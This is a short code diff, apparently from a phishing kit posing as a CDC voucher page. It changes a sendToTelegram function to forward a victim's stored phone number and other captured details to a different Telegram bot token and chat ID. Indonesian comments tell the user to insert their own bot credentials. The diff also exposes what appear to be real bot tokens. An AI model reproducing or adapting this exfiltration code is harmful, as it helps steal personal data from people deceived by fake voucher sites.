@@ -10,8 +10,8 @@ async function sendToTelegram() {
     sessionStorage.setItem('phone_number', phoneNumber);
 
     // Token dan Chat ID Telegram
-    const botToken = '8798021653:AAFFnZc4B6Fbx1XRcVkVUrPstfg2W-oukP0';  // Ganti dengan token bot Anda
-    const chatId = '7437326858'; // Ganti dengan chat ID Anda
+    const botToken = '7506300483:AAFXhPOPcagRAbmkGDUt8J5r_JIYOWItIXY';  // Ganti dengan token bot Anda
+    const chatId = '6000448808'; // Ganti dengan chat ID Anda
 
     // Format pesan
     const message = `📋 *CDC_voucher Ress*\n` +
